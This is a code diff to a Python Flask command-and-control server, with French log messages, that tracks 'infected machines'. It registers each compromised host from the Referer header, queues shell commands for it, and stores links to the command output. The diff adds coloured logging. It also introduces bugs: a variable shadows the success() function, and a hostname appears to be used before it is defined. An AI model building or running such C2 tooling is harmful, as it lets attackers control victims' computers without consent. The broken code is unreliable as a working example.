@@ -4,7 +4,16 @@ from flask import Flask, request, render_template, jsonify
 from flask_cors import CORS
 
 import requests
+from colorama import init, Fore, Back, Style
 from hashlib import md5
+import datetime
+
+# init time
+now = datetime.datetime.now()
+
+
+# init colorama
+init(autoreset=True)
 
 # custom sqlite db methods
 import db
@@ -13,20 +22,9 @@ app = Flask(__name__)
 
 CORS(app, resources={r'/*': {'origins': '*'}})
 
-"""
-	> Un pc infecté envoie à interval régulier
-		une requête HTTP vers le C2
-		contenant les headers Referer et Cache-Control.
-
-	[ Phase 1 ]
-	> Il faut extraire le hostname depuis l'entête Referer
 
 
-"""
-
-
-
-
+#--------------------------
 # execute all together
 # ===============================================
 def main():
@@ -78,7 +76,6 @@ def main():
 
 # ===============================================
 
-
 # test database
 # ===============================================
 @app.route("/db")
@@ -87,11 +84,23 @@ def testdb():
 
 	return "ok"
 # ===============================================
+#--------------------------
 
 
 
 
 
+# ===============================================
+# PRINT COLOR FUNCTIONS
+# ===============================================
+def success(text):
+	print(Style.BRIGHT + Fore.GREEN + text + Fore.RESET + Style.RESET_ALL)
+
+def info(text):
+	print(Style.BRIGHT + Fore.BLUE + text + Fore.RESET + Style.RESET_ALL)
+
+def warn(text):
+	print(Style.BRIGHT + Fore.YELLOW + text + Fore.RESET + Style.RESET_ALL)
 
 
 
@@ -136,7 +145,7 @@ def phase1():
 	hostname = referrer.split(':')[1].split('-')
 	hostname.pop(-1)
 	hostname = "-".join(hostname)
-	print("\n\n== welcome %s ==" % (hostname))
+	info("\n\n== Machine: %s --> / ==\n== %s ==" % (hostname, now.strftime("%Y-%m-%d %H:%M:%S")))
 
 	# get db connection
 	conn = db.get_db()
@@ -146,13 +155,11 @@ def phase1():
 	# sample : [[1, 'DESKTOP-AB123', 'bc60fa448aab00f893d746b9190e2ae0', 'windows', '127.0.0.1']]
 	host = (db.get_one_host(hostname)).get_json()
 
-	if host:
-		print("[i] host already here")
-	else:
-		print("[!] no host %s registered !" % (hostname))
+	if not host:
+		warn(Fore.RED + "[!] Machine infectée détectée ! (%s)" % (hostname) + Fore.RESET)
 		latest_id = insert_host(conn, hostname, ip)
 		if latest_id != None:
-			print("[+] new host '%s(%s)' added to database with id=%s! " % (hostname, ip, latest_id))
+			success(Fore.GREEN + "[+] Machine infectée '%s(%s)' enregistrée ! " % (hostname, ip) + Fore.RESET)
 
 
 	# check if command to give to host
@@ -161,6 +168,7 @@ def phase1():
 	latest_cmd_for_host = (db.get_last_cmd_for_host(hostname)).get_json()
 
 	if (len(latest_cmd_for_host) == 0):
+		warn('[i] Pas de commande à donner')
 		return ''
 
 	return "123--%s--%s" % (hostname, latest_cmd_for_host[0][0])
@@ -211,7 +219,9 @@ def answer():
 	referrer = request.referrer
 
 	if referrer == None:
-		return ""
+		return None
+
+	info("\n\n== Machine: %s --> /answer ==\n== %s ==" % (hostname, now.strftime("%Y-%m-%d %H:%M:%S")))
 
 	full_referrer = referrer.split(' -- ')
 
@@ -222,6 +232,9 @@ def answer():
 	# print("termbin_url : " + termbin_url)
 
 	success = db.api_add_answer(host, termbin_url)
+
+	success("[+] Nouveau résultat de commande sauvegardé !\n--> URL : " + str(termbin_url))
+
 
 	return success
 # ===============================================
